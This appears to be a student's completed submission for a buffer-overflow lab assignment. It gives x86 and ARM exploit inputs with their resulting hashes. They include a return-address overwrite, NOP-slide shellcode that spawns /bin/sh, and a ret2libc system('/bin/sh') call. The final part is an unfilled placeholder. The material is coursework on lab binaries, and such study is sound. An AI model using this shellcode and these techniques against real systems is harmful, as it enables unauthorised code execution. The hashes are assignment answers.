# Submission form

Name: Kunal Mukherjee
NetID: kxm180046

## x86

### Part 1

* Input 

AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH\xdb\x85\x04\x08

* Hash

ab2b3751d7c03ad34660be0ba7f2fa42

### Part 2

* Input

```
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
eip = struct.pack("I",  0xffffcf30) # submissionVM x86 # use strace -e raw=read 
nopslide = "\x90"*1000
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
s = padding+eip+nopslide+payload
print (s)
```

* Hash

10467e5e194180c70c9f4f07fa7150f1

###  Part 3

* Input

```
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
system = struct.pack("I", 0xf7e1a250) # 0xf7e18250) # addr libc
return_after_system = "AAAA"
eip = struct.pack("I", 0xf7f5b3cf) # 0xf7f593cf) # addr "/bin/sh"
s = padding + system + return_after_system + eip
print (s)
```

* Hash

e4a984bd2e5058a317d0979d76106a75

## ARM 

### Part 1

* Input

\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42\x42\x42\x42\x42\xa0\x05\x01\x00

* Hash

ad9ed34a9bd958c558157c91b37504b4

###  Part 2

* Input

```
padding = "AAAAAAAAAAAAAAAABBBBBBBB"
eip = struct.pack("I", 0xbeffefb8) # submissionVM arm
nopslide = "\x90"*4000 #submissionVM arm
payload = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1" + "\x03\xa0\x52\x40\xc2\x71\x05\xb4" + "\x69\x46\x0b\x27\x01\xdf\x7f\x40" + "\x2f\x62\x69\x6e\x2f\x73\x68\x41"
s = padding+eip+nopslide+payload
print(s)
```
* Hash

5fdefc407d56d4c381ff621149fa5a7b

### Part 3

* Input

<input for part1>

* Hash

<hash from /home/assign0x2-p3/solve>


